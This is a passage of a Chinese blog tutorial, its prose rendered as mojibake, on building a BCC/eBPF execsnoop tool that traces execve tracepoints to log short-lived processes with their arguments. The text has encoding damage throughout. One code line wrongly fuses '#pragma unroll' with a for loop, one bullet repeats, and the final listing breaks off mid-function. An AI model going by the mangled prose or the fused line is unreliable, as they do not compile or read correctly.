title="æ•°æ®ç»“æ„å®šä¹‰"></a>æ•°æ®ç»“æ„å®šä¹‰</h3><p>æˆ‘ä»¬å…ˆçœ‹ç¬¬ä¸€éƒ¨åˆ†ã€‚ä¸ºäº†åœ¨ç³»ç»Ÿè°ƒç”¨å…¥å£è·Ÿè¸ªç‚¹å’Œå‡ºå£è·Ÿè¸ªç‚¹é—´å…±äº«è¿›ç¨‹ä¿¡æ¯ç­‰æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªå“ˆå¸Œæ˜ å°„ï¼ˆæ¯”å¦‚å‘½åä¸º Â <code>tasks</code>ï¼‰ï¼›åŒæ ·åœ°ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è¦åœ¨ç”¨æˆ·ç©ºé—´å®æ—¶è·å–è·Ÿè¸ªä¿¡æ¯ï¼Œè¿™å°±éœ€è¦ä¸€ä¸ªæ€§èƒ½äº‹ä»¶æ˜ å°„ã€‚å¯¹äºè¿™ä¸¤ç§æ˜ å°„çš„åˆ›å»ºæ­¥éª¤ï¼ŒBCC å·²ç»æä¾›äº†éå¸¸æ–¹ä¾¿çš„å®å®šä¹‰ï¼Œä½ å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p><p>æ¯”å¦‚ï¼Œä½ å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹å¼æ¥åˆ›å»ºè¿™ä¸¤ä¸ªæ˜ å°„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">    u32 pid;</span><br><span class="line">    <span class="type">char</span> comm[TASK_COMM_LEN];</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> args_size;</span><br><span class="line">    <span class="type">char</span> argv[FULL_MAX_ARGS_ARR];</span><br><span class="line">&#125;;</span><br><span class="line">BPF_PERF_OUTPUT(events);</span><br><span class="line">BPF_HASH(tasks, u32, <span class="keyword">struct</span> <span class="type">data_t</span>);</span><br></pre></td></tr></table></figure><p>ä»£ç ä¸­æŒ‡ä»¤çš„å…·ä½“ä½œç”¨å¦‚ä¸‹ï¼š</p><ul><li><code>struct data_t</code>  å®šä¹‰äº†ä¸€ä¸ªåŒ…å«è¿›ç¨‹åŸºæœ¬ä¿¡æ¯çš„æ•°æ®ç»“æ„ï¼Œå®ƒå°†ç”¨åœ¨å“ˆå¸Œæ˜ å°„çš„å€¼ä¸­ï¼ˆå…¶ä¸­çš„å‚æ•°å¤§å°  <code>args_size</code>  ä¼šåœ¨è¯»å–å‚æ•°å†…å®¹çš„æ—¶å€™ç”¨åˆ°ï¼‰ï¼›</li><li><code>BPF_PERF_OUTPUT(events)</code>  å®šä¹‰äº†ä¸€ä¸ªæ€§èƒ½äº‹ä»¶æ˜ å°„ï¼›</li><li><code>BPF_HASH(tasks, u32, struct data_t)</code>Â  å®šä¹‰äº†ä¸€ä¸ªå“ˆå¸Œæ˜ å°„ï¼Œå…¶é”®ä¸º 32 ä½çš„è¿›ç¨‹ PIDï¼Œè€Œå€¼åˆ™æ˜¯è¿›ç¨‹åŸºæœ¬ä¿¡æ¯ Â <code>data_t</code>ã€‚</li></ul><p>ä¸¤ä¸ªæ˜ å°„å®šä¹‰å¥½ä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯<strong>å®šä¹‰è·Ÿè¸ªç‚¹çš„å¤„ç†å‡½æ•°</strong>ã€‚åœ¨ BCC ä¸­ï¼Œä½ å¯ä»¥é€šè¿‡ Â <code>TRACEPOINT_PROBE(category, event)</code>Â  æ¥å®šä¹‰ä¸€ä¸ªè·Ÿè¸ªç‚¹å¤„ç†å‡½æ•°ã€‚BCC ä¼šå°†æ‰€æœ‰çš„å‚æ•°æ”¾å…¥ Â <code>args</code>Â  è¿™ä¸ªå˜é‡ä¸­ï¼Œè¿™æ ·ä½¿ç”¨ Â <code>args-&gt;&lt;å‚æ•°å&gt;</code>Â  å°±å¯ä»¥è®¿é—®è·Ÿè¸ªç‚¹çš„å‚æ•°å€¼ã€‚</p><p>å¯¹æˆ‘ä»¬è¦è·Ÿè¸ªçš„çŸ­æ—¶è¿›ç¨‹é—®é¢˜æ¥è¯´ï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢è¿™ä¸¤ä¸ªè·Ÿè¸ªç‚¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰sys_enter_execveè·Ÿè¸ªç‚¹å¤„ç†å‡½æ•°.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_enter_execve)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//å¾…æ·»åŠ å¤„ç†é€»è¾‘</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰sys_exit_execveè·Ÿè¸ªç‚¹å¤„ç†å‡½æ•°.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_exit_execve)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//å¾…æ·»åŠ å¤„ç†é€»è¾‘</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å…¥å£è·Ÿè¸ªç‚¹å¤„ç†"><a href="#å…¥å£è·Ÿè¸ªç‚¹å¤„ç†" class="headerlink" title="å…¥å£è·Ÿè¸ªç‚¹å¤„ç†"></a>å…¥å£è·Ÿè¸ªç‚¹å¤„ç†</h3><p>å¯¹äºå…¥å£è·Ÿè¸ªç‚¹ Â <code>sys_enter_execve</code>Â  çš„å¤„ç†ï¼Œè¿˜æ˜¯æŒ‰ç…§ä¸Šä¸€è®²ä¸­ bpftrace çš„é€»è¾‘ï¼Œå…ˆè·å–è¿›ç¨‹çš„ PIDã€è¿›ç¨‹åç§°å’Œå‚æ•°åˆ—è¡¨ä¹‹åï¼Œå†å­˜å…¥åˆšåˆšå®šä¹‰çš„å“ˆå¸Œæ˜ å°„ä¸­ã€‚</p><p>å…¶ä¸­ï¼Œè¿›ç¨‹ PID å’Œè¿›ç¨‹åç§°éƒ½æ¯”è¾ƒå®¹æ˜“è·å–ã€‚å¦‚ä¸‹é¢çš„ä»£ç æ‰€ç¤ºï¼Œä½ å¯ä»¥è°ƒç”¨ Â <code>bpf_get_current_pid_tgid()</code>Â  æŸ¥è¯¢è¿›ç¨‹ PIDï¼Œè°ƒç”¨ Â <code>bpf_get_current_comm()</code>Â  è¯»å–è¿›ç¨‹åç§°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å–è¿›ç¨‹PIDå’Œè¿›ç¨‹åç§°</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data</span> =</span> &#123; &#125;;</span><br><span class="line">u32 pid = bpf_get_current_pid_tgid();  <span class="comment">// å–ä½32ä½ä¸ºè¿›ç¨‹PID</span></span><br><span class="line">data.pid = pid;</span><br><span class="line">bpf_get_current_comm(&amp;data.comm, <span class="keyword">sizeof</span>(data.comm));</span><br></pre></td></tr></table></figure><p>è€Œå‘½ä»¤è¡Œå‚æ•°çš„è·å–å°±æ²¡é‚£ä¹ˆå®¹æ˜“äº†ã€‚å› ä¸º BCC æŠŠæ‰€æœ‰å‚æ•°éƒ½æ”¾åˆ°äº† Â <code>args</code>Â  ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ Â <code>args-&gt;argv</code>Â  æ¥è®¿é—®å‚æ•°åˆ—è¡¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> **argv = (<span class="type">const</span> <span class="type">char</span> **)(args-&gt;argv);</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œ<code>argv</code>Â  æ˜¯ä¸€ä¸ªç”¨æˆ·ç©ºé—´çš„å­—ç¬¦ä¸²æ•°ç»„ï¼ˆæŒ‡é’ˆæ•°ç»„ï¼‰ï¼Œè¿™å°±éœ€è¦è°ƒç”¨ Â <code>bpf_probe_read</code> ç³»åˆ—çš„è¾…åŠ©å‡½æ•°ï¼Œå»è¿™äº›æŒ‡é’ˆä¸­è¯»å–æ•°æ®ã€‚å¹¶ä¸”ï¼Œå­—ç¬¦ä¸²çš„æ•°é‡ï¼ˆå³å‚æ•°çš„ä¸ªæ•°ï¼‰å’Œæ¯ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆå³æ¯ä¸ªå‚æ•°çš„é•¿åº¦ï¼‰éƒ½æ˜¯æœªçŸ¥çš„ï¼Œç”±äº eBPF æ ˆå¤§å°åªæœ‰ 512 å­—èŠ‚ï¼Œå¦‚æœæƒ³è¦æŠŠå®ƒä»¬è¯»å…¥ä¸€ä¸ªä¸´æ—¶çš„å­—ç¬¦æ•°ç»„ä¸­ï¼Œå¿…é¡»è¦ä¿è¯æ¯æ¬¡è¯»å–çš„å†…å®¹ä¸è¶…è¿‡æ ˆçš„å¤§å°ã€‚è¿™ç±»é—®é¢˜æœ‰å¾ˆå¤šç§ä¸åŒçš„å¤„ç†æ–¹æ³•ï¼Œå…¶ä¸­ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„æ–¹å¼å°±æ˜¯<strong>æŠŠå¤šä½™çš„å‚æ•°æˆªæ–­ï¼Œä½¿ç”¨<code>...</code>ä»£æ›¿è¿‡é•¿çš„å‚æ•°</strong>ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒçŸ¥é“äº†è¿›ç¨‹çš„åç§°å’Œå‰å‡ ä¸ªå‚æ•°ï¼Œå¯¹è°ƒè¯•å’Œæ’é”™æ¥è¯´å°±è¶³å¤Ÿäº†ã€‚</p><p>ä½ å¯ä»¥å®šä¹‰æœ€å¤§è¯»å–çš„å‚æ•°ä¸ªæ•°å’Œå‚æ•°é•¿åº¦ï¼Œç„¶ååœ¨å“ˆå¸Œæ˜ å°„çš„å€¼ä¸­å®šä¹‰ä¸€ä¸ªå­—ç¬¦æ•°ç»„ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰å‚æ•°é•¿åº¦å’Œå‚æ•°ä¸ªæ•°å¸¸é‡</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARGSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOTAL_MAX_ARGS 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FULL_MAX_ARGS_ARR (TOTAL_MAX_ARGS * ARGSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="type">char</span> argv[FULL_MAX_ARGS_ARR];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æœ‰äº†å­—ç¬¦æ•°ç»„ï¼Œæ¥ä¸‹æ¥å†å®šä¹‰ä¸€ä¸ªè¾…åŠ©å‡½æ•°ï¼Œä»å‚æ•°æ•°ç»„ä¸­è¯»å–å­—ç¬¦ä¸²å‚æ•°ï¼ˆé™å®šæœ€é•¿ Â <code>ARGSIZE</code>ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä»ç”¨æˆ·ç©ºé—´è¯»å–å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __bpf_read_arg_str(<span class="keyword">struct</span> <span class="type">data_t</span> *data, <span class="type">const</span> <span class="type">char</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (data-&gt;args_size &gt; LAST_ARG) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = bpf_probe_read_user_str(&amp;data-&gt;argv[data-&gt;args_size], ARGSIZE, (<span class="type">void</span> *)ptr);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt; ARGSIZE || ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// increase the args size. the first tailing &#x27;\0&#x27; is not counted and hence it</span></span><br><span class="line">    <span class="comment">// would be overwritten by the next call.</span></span><br><span class="line">    data-&gt;args_size += (ret - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œæœ‰å‡ ç‚¹éœ€è¦ä½ æ³¨æ„ï¼š</p><ul><li><code>bpf_probe_read_user_str()</code>Â  è¿”å›çš„æ˜¯åŒ…å«å­—ç¬¦ä¸²ç»“æŸç¬¦ <code>\0</code> çš„é•¿åº¦ã€‚ä¸ºäº†æ‹¼æ¥æ‰€æœ‰çš„å­—ç¬¦ä¸²ï¼Œåœ¨è®¡ç®—å·²è¯»å–å‚æ•°é•¿åº¦çš„æ—¶å€™ï¼Œéœ€è¦æŠŠÂ <code>\0</code>Â æ’é™¤åœ¨å¤–ã€‚</li><li><code>&amp;data-&gt;argv[data-&gt;args_size]</code>Â  ç”¨æ¥è·å–è¦å­˜æ”¾å‚æ•°çš„ä½ç½®æŒ‡é’ˆï¼Œè¿™æ˜¯ä¸ºäº†æŠŠå¤šä¸ªå‚æ•°æ‹¼æ¥åˆ°ä¸€èµ·ã€‚</li><li>åœ¨è°ƒç”¨ <code>bpf_probe_read_user_str()</code> å‰åï¼Œéœ€è¦å¯¹æŒ‡é’ˆä½ç½®å’Œè¿”å›å€¼è¿›è¡Œæ ¡éªŒï¼Œè¿™å¯ä»¥å¸®åŠ© eBPF éªŒè¯å™¨è·å–æŒ‡é’ˆè¯»å†™çš„è¾¹ç•Œï¼ˆå¦‚æœä½ æ„Ÿå…´è¶£ï¼Œå¯ä»¥å‚è€ƒ<a class="link" href="https://sysdig.com/blog/the-art-of-writing-ebpf-programs-a-primer/">è¿™ç¯‡æ–‡ç« <i class="fas fa-external-link-alt"></i></a>ï¼Œäº†è§£æ›´å¤šçš„å†…å­˜è®¿é—®éªŒè¯ç»†èŠ‚ï¼‰ã€‚</li><li>åœ¨è°ƒç”¨ <code>bpf_probe_read_user_str()</code> å‰åï¼Œéœ€è¦å¯¹æŒ‡é’ˆä½ç½®å’Œè¿”å›å€¼è¿›è¡Œæ ¡éªŒï¼Œè¿™å¯ä»¥å¸®åŠ© eBPF éªŒè¯å™¨è·å–æŒ‡é’ˆè¯»å†™çš„è¾¹ç•Œï¼ˆå¦‚æœä½ æ„Ÿå…´è¶£ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œäº†è§£æ›´å¤šçš„å†…å­˜è®¿é—®éªŒè¯ç»†èŠ‚ï¼‰ã€‚</li></ul><p>æœ‰äº†è¿™ä¸ªè¾…åŠ©å‡½æ•°ä¹‹åï¼Œå› ä¸º eBPF åœ¨è€ç‰ˆæœ¬å†…æ ¸ä¸­å¹¶ä¸æ”¯æŒå¾ªç¯ï¼ˆæœ‰ç•Œå¾ªç¯åœ¨ 5.3 ä¹‹åæ‰æ”¯æŒï¼‰ï¼Œè¦è®¿é—®å­—ç¬¦ä¸²æ•°ç»„ï¼Œè¿˜éœ€è¦ä¸€ä¸ªå°æŠ€å·§ï¼šä½¿ç”¨Â <code>#pragma unroll</code>Â å‘Šè¯‰ç¼–è¯‘å™¨ï¼ŒæŠŠæºç ä¸­çš„å¾ªç¯è‡ªåŠ¨å±•å¼€ã€‚è¿™å°±é¿å…äº†æœ€ç»ˆçš„å­—èŠ‚ç ä¸­åŒ…å«å¾ªç¯ã€‚</p><p>å®Œæ•´çš„å¤„ç†å‡½æ•°å¦‚ä¸‹æ‰€ç¤ºï¼ˆå…·ä½“çš„æ¯ä¸€æ­¥æˆ‘éƒ½åŠ äº†è¯¦ç»†çš„æ³¨é‡Šï¼Œä½ å¯ä»¥å‚è€ƒæ³¨é‡Šæ¥åŠ æ·±ç†è§£ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¼•å…¥å†…æ ¸å¤´æ–‡ä»¶</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;uapi/linux/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰sys_enter_execveè·Ÿè¸ªç‚¹å¤„ç†å‡½æ•°.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_enter_execve)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// å˜é‡å®šä¹‰</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> **argv = (<span class="type">const</span> <span class="type">char</span> **)(args-&gt;argv);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–è¿›ç¨‹PIDå’Œè¿›ç¨‹åç§°</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data</span> =</span> &#123; &#125;;</span><br><span class="line">    u32 pid = bpf_get_current_pid_tgid();</span><br><span class="line">    data.pid = pid;</span><br><span class="line">    bpf_get_current_comm(&amp;data.comm, <span class="keyword">sizeof</span>(data.comm));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå³å¯æ‰§è¡Œæ–‡ä»¶çš„åå­—ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (__bpf_read_arg_str(&amp;data, (<span class="type">const</span> <span class="type">char</span> *)argv[<span class="number">0</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å…¶ä»–å‚æ•°ï¼ˆé™å®šæœ€å¤š5ä¸ªï¼‰</span></span><br><span class="line">    <span class="meta">#<span class="keyword">pragma</span> unrollfor (int i = 1; i &lt; TOTAL_MAX_ARGS; i++) &#123;</span></span><br><span class="line">        <span class="keyword">if</span> (__bpf_read_arg_str(&amp;data, (<span class="type">const</span> <span class="type">char</span> *)argv[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">    <span class="comment">// å­˜å‚¨åˆ°å“ˆå¸Œæ˜ å°„ä¸­</span></span><br><span class="line">    tasks.update(&amp;pid, &amp;data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œä¸ºäº†è·å–å†…æ ¸æ•°æ®ç»“æ„çš„å®šä¹‰ï¼Œåœ¨æ–‡ä»¶çš„å¼€å¤´éœ€è¦å¼•å…¥ç›¸å…³çš„å†…æ ¸å¤´æ–‡ä»¶ã€‚æ­¤å¤–ï¼Œè¯»å–å‚æ•°å®Œæˆä¹‹åï¼Œä¸è¦å¿˜è®°è°ƒç”¨ <code>tasks.update()</code> æŠŠè¿›ç¨‹çš„åŸºæœ¬ä¿¡æ¯å­˜å‚¨åˆ°å“ˆå¸Œæ˜ å°„ä¸­ã€‚å› ä¸ºè¿”å›å€¼éœ€è¦ç­‰åˆ°å‡ºå£è·Ÿè¸ªç‚¹æ—¶æ‰å¯ä»¥è·å–ï¼Œè¿™å„¿åªéœ€è¦æ›´æ–°å“ˆå¸Œæ˜ å°„å°±å¯ä»¥äº†ï¼Œä¸éœ€è¦æŠŠè¿›ç¨‹ä¿¡æ¯æäº¤åˆ°æ€§èƒ½äº‹ä»¶æ˜ å°„ä¸­å»ã€‚</p><h3 id="å‡ºå£è·Ÿè¸ªç‚¹å¤„ç†"><a href="#å‡ºå£è·Ÿè¸ªç‚¹å¤„ç†" class="headerlink" title="å‡ºå£è·Ÿè¸ªç‚¹å¤„ç†"></a>å‡ºå£è·Ÿè¸ªç‚¹å¤„ç†</h3><p>å…¥å£è·Ÿè¸ªç‚¹ Â <code>sys_enter_execve</code>Â  å¤„ç†å¥½ä¹‹åï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹å‡ºå£è·Ÿè¸ªç‚¹ Â <code>sys_exit_execve</code>Â  è¯¥å¦‚ä½•å¤„ç†ã€‚</p><p>ç”±äºè¿›ç¨‹çš„åŸºæœ¬ä¿¡æ¯å·²ç»ä¿å­˜åœ¨äº†å“ˆå¸Œæ˜ å°„ä¸­ï¼Œæ‰€ä»¥å‡ºå£äº‹ä»¶çš„å¤„ç†å¯ä»¥åˆ†ä¸ºæŸ¥è¯¢è¿›ç¨‹åŸºæœ¬ä¿¡æ¯ã€å¡«å……è¿”å›å€¼ã€æœ€åå†æäº¤åˆ°æ€§èƒ½äº‹ä»¶æ˜ å°„è¿™ä¸‰ä¸ªæ­¥éª¤ã€‚å…·ä½“ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰sys_exit_execveè·Ÿè¸ªç‚¹å¤„ç†å‡½æ•°.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_exit_execve)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ä»å“ˆå¸Œæ˜ å°„ä¸­æŸ¥è¯¢è¿›ç¨‹åŸºæœ¬ä¿¡æ¯</span></span><br><span class="line">    u32 pid = bpf_get_current_pid_tgid();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> *<span class="title">data</span> =</span> tasks.lookup(&amp;pid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¡«å……è¿”å›å€¼å¹¶æäº¤åˆ°æ€§èƒ½äº‹ä»¶æ˜ å°„ä¸­</span></span><br><span class="line">    <span class="keyword">if</span> (data != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        data-&gt;retval = args-&gt;ret;</span><br><span class="line">        events.perf_submit(args, data, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> <span class="type">data_t</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æœ€åæ¸…ç†è¿›ç¨‹ä¿¡æ¯</span></span><br><span class="line">        tasks.delete(&amp;pid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œï¼Œå®Œæ•´çš„ eBPF ç¨‹åºå°±å¼€å‘å¥½äº†ï¼Œä½ å¯ä»¥æŠŠä¸Šè¿°çš„ä»£ç ä¿å­˜åˆ°ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶ä¸­ï¼Œå¹¶å‘½åä¸º Â <code>execsnoop.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Tracing execve system call. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// consts for arguments (ensure below stack size limit 512)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARGSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOTAL_MAX_ARGS 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FULL_MAX_ARGS_ARR (TOTAL_MAX_ARGS * ARGSIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_ARG (FULL_MAX_ARGS_ARR - ARGSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// perf event map (sharing data to userspace) and hash map (sharing data between tracepoints)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">u32 pid;</span><br><span class="line"><span class="type">char</span> comm[TASK_COMM_LEN];</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> args_size;</span><br><span class="line"><span class="type">char</span> argv[FULL_MAX_ARGS_ARR];</span><br><span class="line">&#125;;</span><br><span class="line">BPF_PERF_OUTPUT(events);</span><br><span class="line">BPF_HASH(tasks, u32, <span class="keyword">struct</span> <span class="type">data_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// helper function to read string from userspace.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __bpf_read_arg_str(<span class="keyword">struct</span> <span class="type">data_t</span> 